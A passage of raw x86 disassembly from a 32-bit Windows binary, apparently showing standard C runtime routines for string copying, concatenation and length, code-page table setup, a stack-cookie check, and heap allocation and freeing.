  42566f:	mov    ds:0x45dd74,eax
  425674:	call   esi
  425676:	cmp    DWORD PTR ds:0x45dac4,0x2
  42567d:	mov    ds:0x45dd78,eax
  425682:	jne    0x4256a2
  425684:	push   0x4295f4
  425689:	push   edi
  42568a:	call   esi
  42568c:	test   eax,eax
  42568e:	mov    ds:0x45dd80,eax
  425693:	je     0x4256a2
  425695:	push   0x4295dc
  42569a:	push   edi
  42569b:	call   esi
  42569d:	mov    ds:0x45dd7c,eax
  4256a2:	mov    eax,ds:0x45dd7c
  4256a7:	test   eax,eax
  4256a9:	je     0x4256e7
  4256ab:	call   eax
  4256ad:	test   eax,eax
  4256af:	je     0x4256ce
  4256b1:	lea    ecx,[ebp-0x4]
  4256b4:	push   ecx
  4256b5:	push   0xc
  4256b7:	lea    ecx,[ebp-0x10]
  4256ba:	push   ecx
  4256bb:	push   0x1
  4256bd:	push   eax
  4256be:	call   DWORD PTR ds:0x45dd80
  4256c4:	test   eax,eax
  4256c6:	je     0x4256ce
  4256c8:	test   BYTE PTR [ebp-0x8],0x1
  4256cc:	jne    0x4256e7
  4256ce:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256d5:	jb     0x4256e1
  4256d7:	or     BYTE PTR [ebp+0x12],0x20
  4256db:	jmp    0x425706
  4256dd:	xor    eax,eax
  4256df:	jmp    0x425716
  4256e1:	or     BYTE PTR [ebp+0x12],0x4
  4256e5:	jmp    0x425706
  4256e7:	mov    eax,ds:0x45dd74
  4256ec:	test   eax,eax
  4256ee:	je     0x425706
  4256f0:	call   eax
  4256f2:	mov    ebx,eax
  4256f4:	test   ebx,ebx
  4256f6:	je     0x425706
  4256f8:	mov    eax,ds:0x45dd78
  4256fd:	test   eax,eax
  4256ff:	je     0x425706
  425701:	push   ebx
  425702:	call   eax
  425704:	mov    ebx,eax
  425706:	push   DWORD PTR [ebp+0x10]
  425709:	push   DWORD PTR [ebp+0xc]
  42570c:	push   DWORD PTR [ebp+0x8]
  42570f:	push   ebx
  425710:	call   DWORD PTR ds:0x45dd70
  425716:	pop    edi
  425717:	pop    esi
  425718:	pop    ebx
  425719:	leave  
  42571a:	ret    
  42571b:	int3   
  42571c:	int3   
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   edi
  425721:	mov    edi,DWORD PTR [esp+0x8]
  425725:	jmp    0x425795
  425727:	lea    esp,[esp+0x0]
  42572e:	mov    edi,edi
  425730:	mov    ecx,DWORD PTR [esp+0x4]
  425734:	push   edi
  425735:	test   ecx,0x3
  42573b:	je     0x425750
  42573d:	mov    al,BYTE PTR [ecx]
  42573f:	add    ecx,0x1
  425742:	test   al,al
  425744:	je     0x425783
  425746:	test   ecx,0x3
  42574c:	jne    0x42573d
  42574e:	mov    edi,edi
  425750:	mov    eax,DWORD PTR [ecx]
  425752:	mov    edx,0x7efefeff
  425757:	add    edx,eax
  425759:	xor    eax,0xffffffff
  42575c:	xor    eax,edx
  42575e:	add    ecx,0x4
  425761:	test   eax,0x81010100
  425766:	je     0x425750
  425768:	mov    eax,DWORD PTR [ecx-0x4]
  42576b:	test   al,al
  42576d:	je     0x425792
  42576f:	test   ah,ah
  425771:	je     0x42578d
  425773:	test   eax,0xff0000
  425778:	je     0x425788
  42577a:	test   eax,0xff000000
  42577f:	je     0x425783
  425781:	jmp    0x425750
  425783:	lea    edi,[ecx-0x1]
  425786:	jmp    0x425795
  425788:	lea    edi,[ecx-0x2]
  42578b:	jmp    0x425795
  42578d:	lea    edi,[ecx-0x3]
  425790:	jmp    0x425795
  425792:	lea    edi,[ecx-0x4]
  425795:	mov    ecx,DWORD PTR [esp+0xc]
  425799:	test   ecx,0x3
  42579f:	je     0x4257be
  4257a1:	mov    dl,BYTE PTR [ecx]
  4257a3:	add    ecx,0x1
  4257a6:	test   dl,dl
  4257a8:	je     0x425810
  4257aa:	mov    BYTE PTR [edi],dl
  4257ac:	add    edi,0x1
  4257af:	test   ecx,0x3
  4257b5:	jne    0x4257a1
  4257b7:	jmp    0x4257be
  4257b9:	mov    DWORD PTR [edi],edx
  4257bb:	add    edi,0x4
  4257be:	mov    edx,0x7efefeff
  4257c3:	mov    eax,DWORD PTR [ecx]
  4257c5:	add    edx,eax
  4257c7:	xor    eax,0xffffffff
  4257ca:	xor    eax,edx
  4257cc:	mov    edx,DWORD PTR [ecx]
  4257ce:	add    ecx,0x4
  4257d1:	test   eax,0x81010100
  4257d6:	je     0x4257b9
  4257d8:	test   dl,dl
  4257da:	je     0x425810
  4257dc:	test   dh,dh
  4257de:	je     0x425807
  4257e0:	test   edx,0xff0000
  4257e6:	je     0x4257fa
  4257e8:	test   edx,0xff000000
  4257ee:	je     0x4257f2
  4257f0:	jmp    0x4257b9
  4257f2:	mov    DWORD PTR [edi],edx
  4257f4:	mov    eax,DWORD PTR [esp+0x8]
  4257f8:	pop    edi
  4257f9:	ret    
  4257fa:	mov    WORD PTR [edi],dx
  4257fd:	mov    eax,DWORD PTR [esp+0x8]
  425801:	mov    BYTE PTR [edi+0x2],0x0
  425805:	pop    edi
  425806:	ret    
  425807:	mov    WORD PTR [edi],dx
  42580a:	mov    eax,DWORD PTR [esp+0x8]
  42580e:	pop    edi
  42580f:	ret    
  425810:	mov    BYTE PTR [edi],dl
  425812:	mov    eax,DWORD PTR [esp+0x8]
  425816:	pop    edi
  425817:	ret    
  425818:	int3   
  425819:	int3   
  42581a:	int3   
  42581b:	int3   
  42581c:	int3   
  42581d:	int3   
  42581e:	int3   
  42581f:	int3   
  425820:	mov    ecx,DWORD PTR [esp+0xc]
  425824:	push   edi
  425825:	test   ecx,ecx
  425827:	je     0x4258bf
  42582d:	push   esi
  42582e:	push   ebx
  42582f:	mov    ebx,ecx
  425831:	mov    esi,DWORD PTR [esp+0x14]
  425835:	test   esi,0x3
  42583b:	mov    edi,DWORD PTR [esp+0x10]
  42583f:	jne    0x42584c
  425841:	shr    ecx,0x2
  425844:	jne    0x4258cf
  42584a:	jmp    0x425873
  42584c:	mov    al,BYTE PTR [esi]
  42584e:	add    esi,0x1
  425851:	mov    BYTE PTR [edi],al
  425853:	add    edi,0x1
  425856:	sub    ecx,0x1
  425859:	je     0x425886
  42585b:	test   al,al
  42585d:	je     0x42588e
  42585f:	test   esi,0x3
  425865:	jne    0x42584c
  425867:	mov    ebx,ecx
  425869:	shr    ecx,0x2
  42586c:	jne    0x4258cf
  42586e:	and    ebx,0x3
  425871:	je     0x425886
  425873:	mov    al,BYTE PTR [esi]
  425875:	add    esi,0x1
  425878:	mov    BYTE PTR [edi],al
  42587a:	add    edi,0x1
  42587d:	test   al,al
  42587f:	je     0x4258b8
  425881:	sub    ebx,0x1
  425884:	jne    0x425873
  425886:	mov    eax,DWORD PTR [esp+0x10]
  42588a:	pop    ebx
  42588b:	pop    esi
  42588c:	pop    edi
  42588d:	ret    
  42588e:	test   edi,0x3
  425894:	je     0x4258ac
  425896:	mov    BYTE PTR [edi],al
  425898:	add    edi,0x1
  42589b:	sub    ecx,0x1
  42589e:	je     0x42593c
  4258a4:	test   edi,0x3
  4258aa:	jne    0x425896
  4258ac:	mov    ebx,ecx
  4258ae:	shr    ecx,0x2
  4258b1:	jne    0x425927
  4258b3:	mov    BYTE PTR [edi],al
  4258b5:	add    edi,0x1
  4258b8:	sub    ebx,0x1
  4258bb:	jne    0x4258b3
  4258bd:	pop    ebx
  4258be:	pop    esi
  4258bf:	mov    eax,DWORD PTR [esp+0x8]
  4258c3:	pop    edi
  4258c4:	ret    
  4258c5:	mov    DWORD PTR [edi],edx
  4258c7:	add    edi,0x4
  4258ca:	sub    ecx,0x1
  4258cd:	je     0x42586e
  4258cf:	mov    edx,0x7efefeff
  4258d4:	mov    eax,DWORD PTR [esi]
  4258d6:	add    edx,eax
  4258d8:	xor    eax,0xffffffff
  4258db:	xor    eax,edx
  4258dd:	mov    edx,DWORD PTR [esi]
  4258df:	add    esi,0x4
  4258e2:	test   eax,0x81010100
  4258e7:	je     0x4258c5
  4258e9:	test   dl,dl
  4258eb:	je     0x425919
  4258ed:	test   dh,dh
  4258ef:	je     0x42590f
  4258f1:	test   edx,0xff0000
  4258f7:	je     0x425905
  4258f9:	test   edx,0xff000000
  4258ff:	jne    0x4258c5
  425901:	mov    DWORD PTR [edi],edx
  425903:	jmp    0x42591d
  425905:	and    edx,0xffff
  42590b:	mov    DWORD PTR [edi],edx
  42590d:	jmp    0x42591d
  42590f:	and    edx,0xff
  425915:	mov    DWORD PTR [edi],edx
  425917:	jmp    0x42591d
  425919:	xor    edx,edx
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	add    edi,0x4
  425920:	xor    eax,eax
  425922:	sub    ecx,0x1
  425925:	je     0x425933
  425927:	xor    eax,eax
  425929:	mov    DWORD PTR [edi],eax
  42592b:	add    edi,0x4
  42592e:	sub    ecx,0x1
  425931:	jne    0x425929
  425933:	and    ebx,0x3
  425936:	jne    0x4258b3
  42593c:	mov    eax,DWORD PTR [esp+0x10]
  425940:	pop    ebx
  425941:	pop    esi
  425942:	pop    edi
  425943:	ret    
  425944:	int3   
  425945:	int3   
  425946:	int3   
  425947:	int3   
  425948:	int3   
  425949:	int3   
  42594a:	int3   
  42594b:	int3   
  42594c:	int3   
  42594d:	int3   
  42594e:	int3   
  42594f:	int3   
  425950:	mov    ecx,DWORD PTR [esp+0x4]
  425954:	test   ecx,0x3
  42595a:	je     0x425980
  42595c:	mov    al,BYTE PTR [ecx]
  42595e:	add    ecx,0x1
  425961:	test   al,al
  425963:	je     0x4259b3
  425965:	test   ecx,0x3
  42596b:	jne    0x42595c
  42596d:	add    eax,0x0
  425972:	lea    esp,[esp+0x0]
  425979:	lea    esp,[esp+0x0]
  425980:	mov    eax,DWORD PTR [ecx]
  425982:	mov    edx,0x7efefeff
  425987:	add    edx,eax
  425989:	xor    eax,0xffffffff
  42598c:	xor    eax,edx
  42598e:	add    ecx,0x4
  425991:	test   eax,0x81010100
  425996:	je     0x425980
  425998:	mov    eax,DWORD PTR [ecx-0x4]
  42599b:	test   al,al
  42599d:	je     0x4259d1
  42599f:	test   ah,ah
  4259a1:	je     0x4259c7
  4259a3:	test   eax,0xff0000
  4259a8:	je     0x4259bd
  4259aa:	test   eax,0xff000000
  4259af:	je     0x4259b3
  4259b1:	jmp    0x425980
  4259b3:	lea    eax,[ecx-0x1]
  4259b6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ba:	sub    eax,ecx
  4259bc:	ret    
  4259bd:	lea    eax,[ecx-0x2]
  4259c0:	mov    ecx,DWORD PTR [esp+0x4]
  4259c4:	sub    eax,ecx
  4259c6:	ret    
  4259c7:	lea    eax,[ecx-0x3]
  4259ca:	mov    ecx,DWORD PTR [esp+0x4]
  4259ce:	sub    eax,ecx
  4259d0:	ret    
  4259d1:	lea    eax,[ecx-0x4]
  4259d4:	mov    ecx,DWORD PTR [esp+0x4]
  4259d8:	sub    eax,ecx
  4259da:	ret    
  4259db:	push   0x8
  4259dd:	push   0x429650
  4259e2:	call   0x425340
  4259e7:	and    DWORD PTR [ebp-0x4],0x0
  4259eb:	push   0x0
  4259ed:	push   0x1
  4259ef:	call   0x427562
  4259f4:	pop    ecx
  4259f5:	pop    ecx
  4259f6:	jmp    0x4259ff
  4259f8:	xor    eax,eax
  4259fa:	inc    eax
  4259fb:	ret    
  4259fc:	mov    esp,DWORD PTR [ebp-0x18]
  4259ff:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a03:	push   0x3
  425a05:	call   DWORD PTR ds:0x429058
  425a0b:	int3   
  425a0c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a12:	jne    0x425a15
  425a14:	ret    
  425a15:	jmp    0x4259db
  425a1a:	movzx  eax,BYTE PTR [esp+0x4]
  425a1f:	mov    cl,BYTE PTR [esp+0xc]
  425a23:	test   BYTE PTR [eax+0x45df21],cl
  425a29:	jne    0x425a47
  425a2b:	cmp    DWORD PTR [esp+0x8],0x0
  425a30:	je     0x425a40
  425a32:	movzx  eax,WORD PTR [eax*2+0x429a4a]
  425a3a:	and    eax,DWORD PTR [esp+0x8]
  425a3e:	jmp    0x425a42
  425a40:	xor    eax,eax
  425a42:	test   eax,eax
  425a44:	jne    0x425a47
  425a46:	ret    
  425a47:	xor    eax,eax
  425a49:	inc    eax
  425a4a:	ret    
  425a4b:	push   0x4
  425a4d:	push   0x0
  425a4f:	push   DWORD PTR [esp+0xc]
  425a53:	call   0x425a1a
  425a58:	add    esp,0xc
  425a5b:	ret    
  425a5c:	sub    eax,0x3a4
  425a61:	je     0x425a85
  425a63:	sub    eax,0x4
  425a66:	je     0x425a7f
  425a68:	sub    eax,0xd
  425a6b:	je     0x425a79
  425a6d:	dec    eax
  425a6e:	je     0x425a73
  425a70:	xor    eax,eax
  425a72:	ret    
  425a73:	mov    eax,0x404
  425a78:	ret    
  425a79:	mov    eax,0x412
  425a7e:	ret    
  425a7f:	mov    eax,0x804
  425a84:	ret    
  425a85:	mov    eax,0x411
  425a8a:	ret    
  425a8b:	push   edi
  425a8c:	push   0x40
  425a8e:	xor    eax,eax
  425a90:	pop    ecx
  425a91:	mov    edi,0x45df20
  425a96:	rep stos DWORD PTR es:[edi],eax
  425a98:	stos   BYTE PTR es:[edi],al
  425a99:	xor    eax,eax
  425a9b:	mov    ds:0x45e024,eax
  425aa0:	mov    ds:0x45df1c,eax
  425aa5:	mov    ds:0x45df14,eax
  425aaa:	mov    edi,0x45e030
  425aaf:	stos   DWORD PTR es:[edi],eax
  425ab0:	stos   DWORD PTR es:[edi],eax
  425ab1:	stos   DWORD PTR es:[edi],eax
  425ab2:	pop    edi
  425ab3:	ret    
  425ab4:	push   ebp
  425ab5:	mov    ebp,esp
  425ab7:	sub    esp,0x518
  425abd:	mov    eax,ds:0x45d430
  425ac2:	xor    eax,DWORD PTR [ebp+0x4]
  425ac5:	push   esi
  425ac6:	mov    DWORD PTR [ebp-0x4],eax
  425ac9:	lea    eax,[ebp-0x18]
  425acc:	push   eax
  425acd:	push   DWORD PTR ds:0x45e024
  425ad3:	call   DWORD PTR ds:0x4290c4
  425ad9:	cmp    eax,0x1
  425adc:	mov    esi,0x100
  425ae1:	jne    0x425bf4
  425ae7:	xor    eax,eax
  425ae9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425af0:	inc    eax
  425af1:	cmp    eax,esi
  425af3:	jb     0x425ae9
  425af5:	mov    al,BYTE PTR [ebp-0x12]
  425af8:	test   al,al
  425afa:	mov    BYTE PTR [ebp-0x118],0x20
  425b01:	je     0x425b39
  425b03:	push   ebx
  425b04:	lea    edx,[ebp-0x11]
  425b07:	push   edi
  425b08:	movzx  ecx,BYTE PTR [edx]
  425b0b:	movzx  eax,al
  425b0e:	cmp    eax,ecx
  425b10:	ja     0x425b2f
  425b12:	sub    ecx,eax
  425b14:	inc    ecx
  425b15:	mov    ebx,ecx
  425b17:	shr    ecx,0x2
  425b1a:	lea    edi,[ebp+eax*1-0x118]
  425b21:	mov    eax,0x20202020
  425b26:	rep stos DWORD PTR es:[edi],eax
  425b28:	mov    ecx,ebx
  425b2a:	and    ecx,0x3
  425b2d:	rep stos BYTE PTR es:[edi],al
  425b2f:	inc    edx
  425b30:	mov    al,BYTE PTR [edx]
  425b32:	inc    edx
  425b33:	test   al,al
  425b35:	jne    0x425b08
  425b37:	pop    edi
  425b38:	pop    ebx
  425b39:	push   0x0
  425b3b:	push   DWORD PTR ds:0x45df14
  425b41:	lea    eax,[ebp-0x518]
  425b47:	push   DWORD PTR ds:0x45e024
  425b4d:	push   eax
  425b4e:	push   esi
  425b4f:	lea    eax,[ebp-0x118]
  425b55:	push   eax
  425b56:	push   0x1
  425b58:	call   0x427a68
  425b5d:	push   0x0
  425b5f:	push   DWORD PTR ds:0x45e024
  425b65:	lea    eax,[ebp-0x218]
  425b6b:	push   esi
  425b6c:	push   eax
  425b6d:	push   esi
  425b6e:	lea    eax,[ebp-0x118]
  425b74:	push   eax
  425b75:	push   esi
  425b76:	push   DWORD PTR ds:0x45df14
  425b7c:	call   0x4276ac
  425b81:	push   0x0
  425b83:	push   DWORD PTR ds:0x45e024
  425b89:	lea    eax,[ebp-0x318]
  425b8f:	push   esi
  425b90:	push   eax
  425b91:	push   esi
  425b92:	lea    eax,[ebp-0x118]
  425b98:	push   eax
  425b99:	push   0x200
  425b9e:	push   DWORD PTR ds:0x45df14
  425ba4:	call   0x4276ac
  425ba9:	add    esp,0x5c
  425bac:	xor    eax,eax
  425bae:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bb6:	test   cl,0x1
  425bb9:	je     0x425bd1
  425bbb:	or     BYTE PTR [eax+0x45df21],0x10
  425bc2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bc9:	mov    BYTE PTR [eax+0x45e040],cl
  425bcf:	jmp    0x425bed
  425bd1:	test   cl,0x2
  425bd4:	je     0x425be6
  425bd6:	or     BYTE PTR [eax+0x45df21],0x20
  425bdd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425be4:	jmp    0x425bc9
  425be6:	and    BYTE PTR [eax+0x45e040],0x0
  425bed:	inc    eax
  425bee:	cmp    eax,esi
  425bf0:	jb     0x425bae
  425bf2:	jmp    0x425c38
  425bf4:	xor    eax,eax
  425bf6:	cmp    eax,0x41
  425bf9:	jb     0x425c14
  425bfb:	cmp    eax,0x5a
  425bfe:	ja     0x425c14
  425c00:	or     BYTE PTR [eax+0x45df21],0x10
  425c07:	mov    cl,al
  425c09:	add    cl,0x20
  425c0c:	mov    BYTE PTR [eax+0x45e040],cl
  425c12:	jmp    0x425c33
  425c14:	cmp    eax,0x61
  425c17:	jb     0x425c2c
  425c19:	cmp    eax,0x7a
  425c1c:	ja     0x425c2c
  425c1e:	or     BYTE PTR [eax+0x45df21],0x20
  425c25:	mov    cl,al
  425c27:	sub    cl,0x20
  425c2a:	jmp    0x425c0c
  425c2c:	and    BYTE PTR [eax+0x45e040],0x0
  425c33:	inc    eax
  425c34:	cmp    eax,esi
  425c36:	jb     0x425bf6
  425c38:	mov    ecx,DWORD PTR [ebp-0x4]
  425c3b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c3e:	pop    esi
  425c3f:	call   0x425a0c
  425c44:	leave  
  425c45:	ret    
  425c46:	push   ebp
  425c47:	mov    ebp,esp
  425c49:	sub    esp,0x1c
  425c4c:	mov    eax,ds:0x45d430
  425c51:	xor    eax,DWORD PTR [ebp+0x4]
  425c54:	push   ebx
  425c55:	push   esi
  425c56:	mov    esi,DWORD PTR [ebp+0x8]
  425c59:	xor    ebx,ebx
  425c5b:	cmp    esi,ebx
  425c5d:	mov    DWORD PTR [ebp-0x4],eax
  425c60:	push   edi
  425c61:	je     0x425dbb
  425c67:	xor    edx,edx
  425c69:	xor    eax,eax
  425c6b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c71:	je     0x425cd8
  425c73:	add    eax,0x30
  425c76:	inc    edx
  425c77:	cmp    eax,0xf0
  425c7c:	jb     0x425c6b
  425c7e:	lea    eax,[ebp-0x1c]
  425c81:	push   eax
  425c82:	push   esi
  425c83:	call   DWORD PTR ds:0x4290c4
  425c89:	cmp    eax,0x1
  425c8c:	jne    0x425db3
  425c92:	push   0x40
  425c94:	xor    eax,eax
  425c96:	cmp    DWORD PTR [ebp-0x1c],0x1
  425c9a:	pop    ecx
  425c9b:	mov    edi,0x45df20
  425ca0:	rep stos DWORD PTR es:[edi],eax
  425ca2:	stos   BYTE PTR es:[edi],al
  425ca3:	mov    DWORD PTR ds:0x45e024,esi
  425ca9:	mov    DWORD PTR ds:0x45df14,ebx
  425caf:	jbe    0x425da1
  425cb5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cb9:	je     0x425d79
  425cbf:	lea    ecx,[ebp-0x15]
  425cc2:	mov    dl,BYTE PTR [ecx]
  425cc4:	test   dl,dl
  425cc6:	je     0x425d79
  425ccc:	movzx  eax,BYTE PTR [ecx-0x1]
  425cd0:	movzx  edx,dl
  425cd3:	jmp    0x425d69
  425cd8:	push   0x40
  425cda:	xor    eax,eax
  425cdc:	pop    ecx
  425cdd:	mov    edi,0x45df20
  425ce2:	rep stos DWORD PTR es:[edi],eax
  425ce4:	lea    ecx,[edx+edx*2]
  425ce7:	shl    ecx,0x4
  425cea:	mov    DWORD PTR [ebp-0x8],ebx
  425ced:	stos   BYTE PTR es:[edi],al
  425cee:	lea    ebx,[ecx+0x45d450]
  425cf4:	mov    al,BYTE PTR [ebx]
  425cf6:	mov    esi,ebx
  425cf8:	jmp    0x425d23
  425cfa:	mov    dl,BYTE PTR [esi+0x1]
  425cfd:	test   dl,dl
  425cff:	je     0x425d27
  425d01:	movzx  eax,al
  425d04:	movzx  edi,dl
  425d07:	cmp    eax,edi
  425d09:	ja     0x425d1f
  425d0b:	mov    edx,DWORD PTR [ebp-0x8]
  425d0e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d14:	or     BYTE PTR [eax+0x45df21],dl
  425d1a:	inc    eax
  425d1b:	cmp    eax,edi
  425d1d:	jbe    0x425d14
  425d1f:	inc    esi
  425d20:	inc    esi
  425d21:	mov    al,BYTE PTR [esi]
  425d23:	test   al,al
  425d25:	jne    0x425cfa
  425d27:	inc    DWORD PTR [ebp-0x8]
  425d2a:	add    ebx,0x8
  425d2d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d31:	jb     0x425cf4
  425d33:	mov    eax,DWORD PTR [ebp+0x8]
  425d36:	mov    ds:0x45e024,eax
  425d3b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d45:	call   0x425a5c
  425d4a:	lea    ecx,[ecx+0x45d444]
  425d50:	mov    esi,ecx
  425d52:	mov    edi,0x45e030
  425d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d59:	mov    ds:0x45df14,eax
  425d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d5f:	jmp    0x425dc0
  425d61:	or     BYTE PTR [eax+0x45df21],0x4
  425d68:	inc    eax
  425d69:	cmp    eax,edx
  425d6b:	jbe    0x425d61
  425d6d:	inc    ecx
  425d6e:	inc    ecx
  425d6f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d73:	jne    0x425cc2
  425d79:	xor    ecx,ecx
  425d7b:	inc    ecx
  425d7c:	mov    eax,ecx
  425d7e:	or     BYTE PTR [eax+0x45df21],0x8
  425d85:	inc    eax
  425d86:	cmp    eax,0xff
  425d8b:	jb     0x425d7e
  425d8d:	mov    eax,esi
  425d8f:	call   0x425a5c
  425d94:	mov    ds:0x45df14,eax
  425d99:	mov    DWORD PTR ds:0x45df1c,ecx
  425d9f:	jmp    0x425da7
  425da1:	mov    DWORD PTR ds:0x45df1c,ebx
  425da7:	xor    eax,eax
  425da9:	mov    edi,0x45e030
  425dae:	stos   DWORD PTR es:[edi],eax
  425daf:	stos   DWORD PTR es:[edi],eax
  425db0:	stos   DWORD PTR es:[edi],eax
  425db1:	jmp    0x425dc0
  425db3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425db9:	je     0x425dc9
  425dbb:	call   0x425a8b
  425dc0:	call   0x425ab4
  425dc5:	xor    eax,eax
  425dc7:	jmp    0x425dcc
  425dc9:	or     eax,0xffffffff
  425dcc:	mov    ecx,DWORD PTR [ebp-0x4]
  425dcf:	xor    ecx,DWORD PTR [ebp+0x4]
  425dd2:	pop    edi
  425dd3:	pop    esi
  425dd4:	pop    ebx
  425dd5:	call   0x425a0c
  425dda:	leave  
  425ddb:	ret    
  425ddc:	push   0x14
  425dde:	push   0x429660
  425de3:	call   0x425340
  425de8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dec:	push   0xd
  425dee:	call   0x4254ff
  425df3:	pop    ecx
  425df4:	xor    edi,edi
  425df6:	mov    DWORD PTR [ebp-0x4],edi
  425df9:	mov    DWORD PTR ds:0x45dd84,edi
  425dff:	mov    eax,DWORD PTR [ebp+0x8]
  425e02:	cmp    eax,0xfffffffe
  425e05:	jne    0x425e19
  425e07:	mov    DWORD PTR ds:0x45dd84,0x1
  425e11:	call   DWORD PTR ds:0x4290c0
  425e17:	jmp    0x425e44
  425e19:	cmp    eax,0xfffffffd
  425e1c:	jne    0x425e30
  425e1e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e28:	call   DWORD PTR ds:0x4290bc
  425e2e:	jmp    0x425e44
  425e30:	cmp    eax,0xfffffffc
  425e33:	jne    0x425e44
  425e35:	mov    DWORD PTR ds:0x45dd84,0x1
  425e3f:	mov    eax,ds:0x45ddb4
  425e44:	mov    DWORD PTR [ebp+0x8],eax
  425e47:	cmp    eax,DWORD PTR ds:0x45e024
  425e4d:	je     0x425f0e
  425e53:	mov    esi,DWORD PTR ds:0x45df18
  425e59:	mov    DWORD PTR [ebp-0x20],esi
  425e5c:	cmp    esi,edi
  425e5e:	je     0x425e64
  425e60:	cmp    DWORD PTR [esi],edi
  425e62:	je     0x425e74
  425e64:	push   0x220
  425e69:	call   0x426062
  425e6e:	pop    ecx
  425e6f:	mov    esi,eax
  425e71:	mov    DWORD PTR [ebp-0x20],esi
  425e74:	cmp    esi,edi
  425e76:	je     0x425ef7
  425e78:	push   DWORD PTR [ebp+0x8]
  425e7b:	call   0x425c46
  425e80:	pop    ecx
  425e81:	mov    DWORD PTR [ebp-0x1c],eax
  425e84:	cmp    eax,edi
  425e86:	jne    0x425ef7
  425e88:	mov    DWORD PTR [esi],edi
  425e8a:	mov    eax,ds:0x45e024
  425e8f:	mov    DWORD PTR [esi+0x4],eax
  425e92:	mov    eax,ds:0x45df1c
  425e97:	mov    DWORD PTR [esi+0x8],eax
  425e9a:	mov    eax,ds:0x45df14
  425e9f:	mov    DWORD PTR [esi+0xc],eax
  425ea2:	xor    eax,eax
  425ea4:	mov    DWORD PTR [ebp-0x24],eax
  425ea7:	cmp    eax,0x5
  425eaa:	jge    0x425ebc
  425eac:	mov    cx,WORD PTR [eax*2+0x45e030]
  425eb4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425eb9:	inc    eax
  425eba:	jmp    0x425ea4
  425ebc:	xor    eax,eax
  425ebe:	mov    DWORD PTR [ebp-0x24],eax
  425ec1:	cmp    eax,0x101
  425ec6:	jge    0x425ed5
  425ec8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ece:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ed2:	inc    eax
  425ed3:	jmp    0x425ebe
  425ed5:	xor    eax,eax
  425ed7:	mov    DWORD PTR [ebp-0x24],eax
  425eda:	cmp    eax,0x100
  425edf:	jge    0x425ef1
  425ee1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ee7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425eee:	inc    eax
  425eef:	jmp    0x425ed7
  425ef1:	mov    DWORD PTR ds:0x45df18,esi
  425ef7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425efb:	jne    0x425f11
  425efd:	cmp    esi,DWORD PTR ds:0x45df18
  425f03:	je     0x425f11
  425f05:	push   esi
  425f06:	call   0x425f4a
  425f0b:	pop    ecx
  425f0c:	jmp    0x425f11
  425f0e:	mov    DWORD PTR [ebp-0x1c],edi
  425f11:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f15:	call   0x425f23
  425f1a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f1d:	call   0x42537b
  425f22:	ret    
  425f23:	push   0xd
  425f25:	call   0x42546b
  425f2a:	pop    ecx
  425f2b:	ret    
  425f2c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f33:	jne    0x425f47
  425f35:	push   0xfffffffd
  425f37:	call   0x425ddc
  425f3c:	pop    ecx
  425f3d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f47:	xor    eax,eax
  425f49:	ret    
  425f4a:	push   0xc
  425f4c:	push   0x429670
  425f51:	call   0x425340
  425f56:	mov    esi,DWORD PTR [ebp+0x8]
  425f59:	test   esi,esi
  425f5b:	je     0x425fb5
  425f5d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f64:	jne    0x425fa6
  425f66:	push   0x4
  425f68:	call   0x4254ff
  425f6d:	pop    ecx
  425f6e:	and    DWORD PTR [ebp-0x4],0x0
  425f72:	push   esi
  425f73:	call   0x426722
  425f78:	pop    ecx
  425f79:	mov    DWORD PTR [ebp-0x1c],eax
  425f7c:	test   eax,eax
  425f7e:	je     0x425f89
  425f80:	push   esi
  425f81:	push   eax
  425f82:	call   0x42674d
  425f87:	pop    ecx
  425f88:	pop    ecx
  425f89:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f8d:	call   0x425f9d
  425f92:	cmp    DWORD PTR [ebp-0x1c],0x0
  425f96:	jne    0x425fb5
  425f98:	push   DWORD PTR [ebp+0x8]
  425f9b:	jmp    0x425fa7
  425f9d:	push   0x4
  425f9f:	call   0x42546b
  425fa4:	pop    ecx
  425fa5:	ret    
  425fa6:	push   esi
  425fa7:	push   0x0
  425fa9:	push   DWORD PTR ds:0x45e140
  425faf:	call   DWORD PTR ds:0x42902c
  425fb5:	call   0x42537b
  425fba:	ret    
  425fbb:	push   0xc
  425fbd:	push   0x429680
  425fc2:	call   0x425340
  425fc7:	mov    esi,DWORD PTR [ebp+0x8]
  425fca:	cmp    DWORD PTR ds:0x45e144,0x3
  425fd1:	jne    0x426001
  425fd3:	cmp    esi,DWORD PTR ds:0x45df04
  425fd9:	ja     0x426001
  425fdb:	push   0x4
  425fdd:	call   0x4254ff
  425fe2:	pop    ecx
  425fe3:	and    DWORD PTR [ebp-0x4],0x0
  425fe7:	push   esi
  425fe8:	call   0x426f01
  425fed:	pop    ecx
  425fee:	mov    DWORD PTR [ebp-0x1c],eax
